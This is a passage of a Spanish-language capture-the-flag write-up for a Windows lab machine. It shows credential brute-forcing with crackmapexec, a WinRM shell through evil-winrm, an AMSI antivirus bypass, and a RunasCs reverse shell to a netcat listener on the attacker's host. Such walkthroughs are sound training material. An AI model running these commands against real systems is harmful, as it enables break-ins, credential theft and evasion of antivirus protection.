+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="sr">/home/use</span><span class="n">r</span><span class="p">]</span>
+    <span class="err">└─$</span> <span class="n">crackmapexec</span> <span class="n">winrm</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span> <span class="o">-</span><span class="n">u</span> <span class="n">nica</span> <span class="o">-</span><span class="nb">p</span> <span class="n">hardcore</span>
+    <span class="no">SMB</span>    <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">5985</span>   <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Windows</span> <span class="mi">10</span> <span class="o">/</span> <span class="no">Server</span> <span class="mi">2019</span> <span class="no">Build</span> <span class="mi">17763</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span>
+    <span class="no">HTTP</span>    <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">5985</span>   <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span><span class="p">:</span><span class="mi">5985</span><span class="o">/</span><span class="n">wsman</span>
+    <span class="no">WINRM</span>  <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">5985</span>   <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">nica</span><span class="ss">:hardcore</span> <span class="p">(</span><span class="no">Pwn3d</span><span class="o">!</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Vemos que ha funccionado! nos sale <strong>WIN-IURF14RBVGV\nica:hardcore (Pwn3d!)</strong></p>
+
+<p>(Pwn3d!) → TOTAL. Has autenticado y tienes acceso remoto mediante WinRM.</p>
+
+<p>Una vez hemos verificado que podemos conectarnos accederemos remotamente <strong>usando evil-winrm</strong></p>
+
+<h2 id="evil-winrm">Evil-winrm</h2>
+
+<p>Podemos simplemente conectarnos usando <strong>Evil-WinRM</strong> y obtener una <strong>PowerShell</strong> como el usuario nica.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="sr">/home/use</span><span class="n">r</span><span class="p">]</span>
+  <span class="err">└─$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span> <span class="o">-</span><span class="n">u</span> <span class="n">nica</span> <span class="o">-</span><span class="nb">p</span> <span class="n">hardcore</span>
+
+    <span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="o">.</span><span class="mi">7</span>
+
+    <span class="no">Warning</span><span class="p">:</span> <span class="no">Remote</span> <span class="n">path</span> <span class="n">completions</span> <span class="n">is</span> <span class="n">disabled</span> <span class="n">due</span> <span class="n">to</span> <span class="n">ruby</span> <span class="ss">limitation: </span><span class="n">quoting_detection_proc</span><span class="p">()</span> <span class="n">function</span> <span class="n">is</span> <span class="n">unimplemented</span> <span class="n">on</span> <span class="n">this</span> <span class="n">machine</span>
+
+    <span class="no">Data</span><span class="p">:</span> <span class="no">For</span> <span class="n">more</span> <span class="n">information</span><span class="p">,</span> <span class="n">check</span> <span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span> <span class="no">GitHub</span><span class="p">:</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">github</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="no">Hackplayers</span><span class="o">/</span><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span><span class="c1">#Remote-path-completion</span>
+
+    <span class="no">Info</span><span class="p">:</span> <span class="no">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>
+    <span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">nica</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="n">whoami</span>
+    <span class="n">win</span><span class="o">-</span><span class="n">iurf14rbvgv</span><span class="p">\</span><span class="n">nica</span>
+</code></pre></div></div>
+<p>En este punto podemos leer la primera flag con dicho usuario</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+  <span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">nica</span><span class="o">&gt;</span> <span class="n">ls</span>
+
+  <span class="no">Directorio</span><span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">nica</span>
+
+    <span class="no">Mode</span>                <span class="no">LastWriteTime</span>         <span class="no">Length</span> <span class="no">Name</span>
+    <span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
+    <span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">12</span> <span class="no">AM</span>                <span class="no">Desktop</span>
+    <span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2023</span>   <span class="mi">6</span><span class="p">:</span><span class="mi">44</span> <span class="no">PM</span>                <span class="no">Documents</span>
+    <span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">12</span> <span class="no">AM</span>                <span class="no">Downloads</span>
+    <span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">12</span> <span class="no">AM</span>                <span class="no">Favorites</span>
+    <span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">12</span> <span class="no">AM</span>                <span class="no">Links</span>
+    <span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">12</span> <span class="no">AM</span>                <span class="no">Music</span>
+    <span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">12</span> <span class="no">AM</span>                <span class="no">Pictures</span>
+    <span class="n">d</span><span class="o">-----</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">12</span> <span class="no">AM</span>                <span class="no">Saved</span> <span class="no">Games</span>
+    <span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">12</span> <span class="no">AM</span>                <span class="no">Videos</span>
+    <span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2023</span>   <span class="mi">6</span><span class="p">:</span><span class="mi">44</span> <span class="no">PM</span>             <span class="mi">10</span> <span class="n">user</span><span class="p">.</span><span class="nf">txt</span>
+      
+  <span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">nica</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="n">user</span><span class="p">.</span><span class="nf">txt</span>
+   <span class="no">H</span><span class="o">******</span>
+</code></pre></div></div>
+<p>Ahora podemos observar varias cosas, pero en lo que nos centraremos es en que hay un usuario administrador llamado <strong>akanksha.</strong></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">nica</span><span class="o">&gt;</span> <span class="n">net</span> <span class="n">users</span>
+
+  <span class="no">Cuentas</span> <span class="n">de</span> <span class="n">usuario</span> <span class="n">de</span> <span class="p">\\</span>
+
+  <span class="o">-------------------------------------------------------------------------------</span>
+  <span class="no">Administrador</span>            <span class="n">akanksha</span>                 <span class="no">DefaultAccount</span>
+  <span class="no">Invitado</span>                 <span class="n">nica</span>                     <span class="no">WDAGUtilityAccount</span>
+  <span class="no">El</span> <span class="n">comando</span> <span class="n">se</span> <span class="n">ha</span> <span class="n">completado</span> <span class="n">con</span> <span class="n">uno</span> <span class="n">o</span> <span class="n">m</span> <span class="n">s</span> <span class="n">errores</span><span class="o">.</span>
+</code></pre></div></div>
+<h1 id="flag-de-root">Flag de root</h1>
+
+<p>Una vez sabemos que el usuario administrador es <strong>akanksha</strong> hacemos fueza bruta como antes</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 
+    <span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="sr">/home/use</span><span class="n">r</span><span class="p">]</span>
+    <span class="err">└─$</span> <span class="c1"># crackmapexec smb 192.168.56.102 -u akanksha -p /usr/share/wordlists/rockyou.txt</span>
+    <span class="no">SMB</span>         <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Windows</span> <span class="mi">10</span> <span class="o">/</span> <span class="no">Server</span> <span class="mi">2019</span> <span class="no">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="ss">:WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="ss">:False</span><span class="p">)</span> <span class="p">(</span><span class="no">SMBv1</span><span class="ss">:False</span><span class="p">)</span>
+    <span class="no">SMB</span>         <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">akanksha</span><span class="ss">:jessica</span> <span class="no">STATUS_LOGON_FAILURE</span>
+    <span class="no">SMB</span>         <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">akanksha</span><span class="ss">:michelle</span> <span class="no">STATUS_LOGON_FAILURE</span>
+    <span class="no">SMB</span>         <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">akanksha</span><span class="ss">:tigger</span> <span class="no">STATUS_LOGON_FAILURE</span>
+    <span class="no">SMB</span>         <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span>   <span class="mi">445</span>    <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="n">akanksha</span><span class="ss">:sw</span><span class="o">****</span>
+</code></pre></div></div>
+<p>Ya hemos encontrado la contraseña, pero…</p>
+
+<p>Aunque esta contraseña es válida para el servicio SMB, no lo es para WinRM, así que debemos pensar en otra forma de entrar.</p>
+
+<p>Ya que tenemos una shell, podríamos pensar en usar <strong>runas</strong>, pero nuestra shell no es interactiva, por lo que podríamos importar el módulo de <a href="https://github.com/antonioCoco/RunasCs"><strong>RunasCs</strong></a> para solucionar ese problema.</p>
+
+<h2 id="qué-es-runas">Qué es runas?</h2>
+<p>Es un comando de la línea de sistemas operativos Microsoft Windows que permite a un usuario ejecutar herramientas y programas específicos bajo un nombre de usuario diferente al que utilizó para iniciar sesión en una computadora de forma interactiva</p>
+
+<h2 id="qué-es-runascs-">Qué es RunasCs ?</h2>
+<p>RunasCs es una herramienta escrita en C# que simula el comportamiento de runas, pero:</p>
+
+<ol>
+  <li>No necesita interacción directa.</li>
+  <li>Puedes pasarle el usuario y la contraseña directamente por línea de comandos.</li>
+  <li>Ejecuta comandos como otro usuario desde la shell remota.</li>
+</ol>
+
+<p>Nos descargamos <strong>RunasCs</strong></p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  
+    <span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="sr">/home/use</span><span class="n">r</span><span class="p">]</span>
+    <span class="err">└─</span><span class="c1"># git clone https://github.com/antonioCoco/RunasCs.git</span>
+    <span class="no">Cloning</span> <span class="n">into</span> <span class="s1">'RunasCs'</span><span class="o">...</span>
+    <span class="ss">remote: </span><span class="no">Enumerating</span> <span class="ss">objects: </span><span class="mi">371</span><span class="p">,</span> <span class="n">done</span><span class="p">.</span>
+    <span class="nf">remote</span><span class="p">:</span> <span class="no">Counting</span> <span class="ss">objects: </span><span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">206</span><span class="o">/</span><span class="mi">206</span><span class="p">),</span> <span class="n">done</span><span class="p">.</span>
+    <span class="nf">remote</span><span class="p">:</span> <span class="no">Compressing</span> <span class="ss">objects: </span><span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">108</span><span class="o">/</span><span class="mi">108</span><span class="p">),</span> <span class="n">done</span><span class="p">.</span>
+    <span class="nf">remote</span><span class="p">:</span> <span class="no">Total</span> <span class="mi">371</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">131</span><span class="p">),</span> <span class="n">reused</span> <span class="mi">145</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">98</span><span class="p">),</span> <span class="n">pack</span><span class="o">-</span><span class="n">reused</span> <span class="mi">165</span> <span class="p">(</span><span class="n">from</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="no">Receiving</span> <span class="ss">objects: </span><span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">371</span><span class="o">/</span><span class="mi">371</span><span class="p">),</span> <span class="mf">331.19</span> <span class="no">KiB</span> <span class="o">|</span> <span class="mf">36.00</span> <span class="no">KiB</span><span class="o">/</span><span class="n">s</span><span class="p">,</span> <span class="n">done</span><span class="o">.</span>
+    <span class="no">Resolving</span> <span class="ss">deltas: </span><span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">231</span><span class="o">/</span><span class="mi">231</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
+  
+</code></pre></div></div>
+<p>Una vez finalizada la instalación del repositorio, nos conectaremos como el usuario <strong>nica</strong> e importaremos <strong>RunasCs</strong></p>
+
+<p>Pero antes, nos pondremos en escucha en el puerto <strong>4444</strong>:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="sr">/home/use</span><span class="n">r</span><span class="p">]</span>
+      <span class="err">└─</span><span class="c1"># nc -nlvp 4444</span>
+      <span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">4444</span> <span class="o">...</span>
+</code></pre></div></div>
+
+<p>Ahora ya podemos conectarnos como el usuario <strong>nica</strong></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    <span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="sr">/home/use</span><span class="n">r</span><span class="p">]</span>
+    <span class="err">└─</span><span class="c1"># evil-winrm -i 192.168.56.102 -u nica -p hardcore</span>
+
+    <span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">nica</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="n">upload</span> <span class="sr">/home/use</span><span class="n">r</span><span class="o">/</span><span class="no">Invoke</span><span class="o">-</span><span class="no">RunasCs</span><span class="p">.</span><span class="nf">ps1</span>
+
+    <span class="no">Info</span><span class="p">:</span> <span class="no">Uploading</span> <span class="sr">/home/use</span><span class="n">r</span><span class="o">/</span><span class="no">Invoke</span><span class="o">-</span><span class="no">RunasCs</span><span class="p">.</span><span class="nf">ps1</span> <span class="n">to</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">nica</span><span class="p">\</span><span class="no">Documents</span><span class="p">\</span><span class="no">Invoke</span><span class="o">-</span><span class="no">RunasCs</span><span class="p">.</span><span class="nf">ps1</span>
+
+    <span class="no">Data</span><span class="p">:</span> <span class="mi">117712</span> <span class="n">bytes</span> <span class="n">of</span> <span class="mi">117712</span> <span class="n">bytes</span> <span class="n">copied</span>
+
+    <span class="no">Info</span><span class="p">:</span> <span class="no">Upload</span> <span class="n">successful!</span>
+    
+    <span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">nica</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span>
+
+</code></pre></div></div>
+
+<p>Si intentamos importar el modulo de Invoke-RunasCs.ps1 nos lo bloquea el antivirus.</p>
+
+<p>AMSI (Antimalware Scan Interface) es una protección mejorada de Windows que analiza scripts y bloquea los que contienen firmas conocidas de malware.</p>
+
+<p>Para evitar esto, entraremos a esta web y generar un bypass personalizado: <a href="https://d1se0.github.io/AMSI-Bypass-Generator/index.html"><strong>AMSI-Bypass-Generator</strong></a></p>
+
+<p>El bypass que crearás con esta web lo que hace es Desactiva AMSI en memoria</p>
+
+<p>Una vez desactivado el AMSI ya podemos importar los módulos de Invoke-RunasCs.ps1</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+  <span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">nica</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="n">import</span><span class="o">-</span><span class="n">module</span> <span class="p">.</span><span class="nf">/</span><span class="no">Invoke</span><span class="o">-</span><span class="no">RunasCs</span><span class="p">.</span><span class="nf">ps1</span>
+</code></pre></div></div>
+<p>Ahora nos conectaremos remotamente</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">nica</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="n">invoke</span><span class="o">-</span><span class="no">RunasCs</span> <span class="n">akanksha</span> <span class="n">sweetgirl</span> <span class="n">powershell</span> <span class="o">-</span><span class="n">remote</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="p">:</span><span class="mi">4444</span>
+
+    <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Running</span> <span class="k">in</span> <span class="n">session</span> <span class="mi">0</span> <span class="n">with</span> <span class="n">process</span> <span class="n">function</span> <span class="no">CreateProcessWithLogonW</span><span class="p">()</span>
+    <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Using</span> <span class="no">Station</span><span class="p">\</span><span class="no">Desktop</span><span class="p">:</span> <span class="no">Service</span><span class="o">-</span><span class="mh">0x0</span><span class="o">-</span><span class="mi">503</span><span class="n">d31</span><span class="vg">$\</span><span class="no">Default</span>
+    <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Async</span> <span class="n">process</span> <span class="s1">'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'</span> <span class="n">with</span> <span class="n">pid</span> <span class="mi">2788</span> <span class="n">created</span> <span class="k">in</span> <span class="n">background</span><span class="p">.</span>
+    <span class="nf">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">nica</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Si bien recordamos, anteriormente nos pusimos en escucha por el 4444 con <strong>nc -nlvp</strong>, si nos dirigimos a la terminal vemos que tenemos acceso al usuario <strong>akanksha</strong> y podemos listar los grupos a los cuales pertenece dicho usuario</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">nc</span> <span class="o">-</span><span class="n">nlvp</span> <span class="mi">4444</span>
+      <span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">4444</span> <span class="o">...</span>
+      <span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="no">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">56.102</span><span class="p">]</span> <span class="mi">49775</span>
+      <span class="no">Windows</span> <span class="no">PowerShell</span>
+      <span class="no">Copyright</span> <span class="p">(</span><span class="no">C</span><span class="p">)</span> <span class="no">Microsoft</span> <span class="no">Corporation</span><span class="o">.</span> <span class="no">Todos</span> <span class="n">los</span> <span class="n">derechos</span> <span class="n">reservados</span><span class="o">.</span>
+
+
+      <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">system32</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="sr">/groups
+      whoami /</span><span class="n">groups</span>
+
+      <span class="no">INFORMACION</span> <span class="no">DE</span> <span class="no">GRUPO</span>
+      <span class="o">--------------------</span>
+
+      <span class="no">Nombre</span> <span class="n">de</span> <span class="n">grupo</span>                              <span class="no">Tipo</span>           <span class="no">SID</span>                                            <span class="no">Atributos</span>
+      <span class="o">============================================</span> <span class="o">==============</span> <span class="o">==============================================</span> <span class="o">========================================================================</span>
+      <span class="no">Todos</span>                                        <span class="no">Grupo</span> <span class="n">conocido</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">0</span>                                        <span class="no">Grupo</span> <span class="n">obligatorio</span><span class="p">,</span> <span class="no">Habilitado</span> <span class="n">de</span> <span class="n">manera</span> <span class="n">predeterminada</span><span class="p">,</span> <span class="no">Grupo</span> <span class="n">habilitado</span>
+      <span class="no">WIN</span><span class="o">-</span><span class="no">IURF14RBVGV</span><span class="p">\</span><span class="no">Idministritirs</span>               <span class="no">Alias</span>          <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">2519875556</span><span class="o">-</span><span class="mi">2276787807</span><span class="o">-</span><span class="mi">2868128514</span><span class="o">-</span><span class="mi">1002</span> <span class="no">Grupo</span> <span class="n">obligatorio</span><span class="p">,</span> <span class="no">Habilitado</span> <span class="n">de</span> <span class="n">manera</span> <span class="n">predeterminada</span><span class="p">,</span> <span class="no">Grupo</span> <span class="n">habilitado</span>
+      <span class="no">BUILTIN</span><span class="p">\</span><span class="no">Usuarios</span>                             <span class="no">Alias</span>          <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">545</span>                                   <span class="no">Grupo</span> <span class="n">obligatorio</span><span class="p">,</span> <span class="no">Habilitado</span> <span class="n">de</span> <span class="n">manera</span> <span class="n">predeterminada</span><span class="p">,</span> <span class="no">Grupo</span> <span class="n">habilitado</span>
+      <span class="no">NT</span> <span class="no">AUTHORITY</span><span class="p">\</span><span class="no">INTERACTIVE</span>                     <span class="no">Grupo</span> <span class="n">conocido</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">4</span>                                        <span class="no">Grupo</span> <span class="n">obligatorio</span><span class="p">,</span> <span class="no">Habilitado</span> <span class="n">de</span> <span class="n">manera</span> <span class="n">predeterminada</span><span class="p">,</span> <span class="no">Grupo</span> <span class="n">habilitado</span>
+      <span class="no">INICIO</span> <span class="no">DE</span> <span class="no">SESION</span> <span class="no">EN</span> <span class="no">LA</span> <span class="no">CONSOLA</span>               <span class="no">Grupo</span> <span class="n">conocido</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span>                                        <span class="no">Grupo</span> <span class="n">obligatorio</span><span class="p">,</span> <span class="no">Habilitado</span> <span class="n">de</span> <span class="n">manera</span> <span class="n">predeterminada</span><span class="p">,</span> <span class="no">Grupo</span> <span class="n">habilitado</span>
+      <span class="no">NT</span> <span class="no">AUTHORITY</span><span class="p">\</span><span class="no">Usuarios</span> <span class="n">autentificados</span>         <span class="no">Grupo</span> <span class="n">conocido</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">11</span>                                       <span class="no">Grupo</span> <span class="n">obligatorio</span><span class="p">,</span> <span class="no">Habilitado</span> <span class="n">de</span> <span class="n">manera</span> <span class="n">predeterminada</span><span class="p">,</span> <span class="no">Grupo</span> <span class="n">habilitado</span>
+      <span class="no">NT</span> <span class="no">AUTHORITY</span><span class="p">\</span><span class="no">Esta</span> <span class="n">compa</span><span class="err">ñ</span><span class="n">ia</span>                   <span class="no">Grupo</span> <span class="n">conocido</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">15</span>                                       <span class="no">Grupo</span> <span class="n">obligatorio</span><span class="p">,</span> <span class="no">Habilitado</span> <span class="n">de</span> <span class="n">manera</span> <span class="n">predeterminada</span><span class="p">,</span> <span class="no">Grupo</span> <span class="n">habilitado</span>
+      <span class="no">NT</span> <span class="no">AUTHORITY</span><span class="p">\</span><span class="no">Cuenta</span> <span class="n">local</span>                    <span class="no">Grupo</span> <span class="n">conocido</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">113</span>                                      <span class="no">Grupo</span> <span class="n">obligatorio</span><span class="p">,</span> <span class="no">Habilitado</span> <span class="n">de</span> <span class="n">manera</span> <span class="n">predeterminada</span><span class="p">,</span> <span class="no">Grupo</span> <span class="n">habilitado</span>
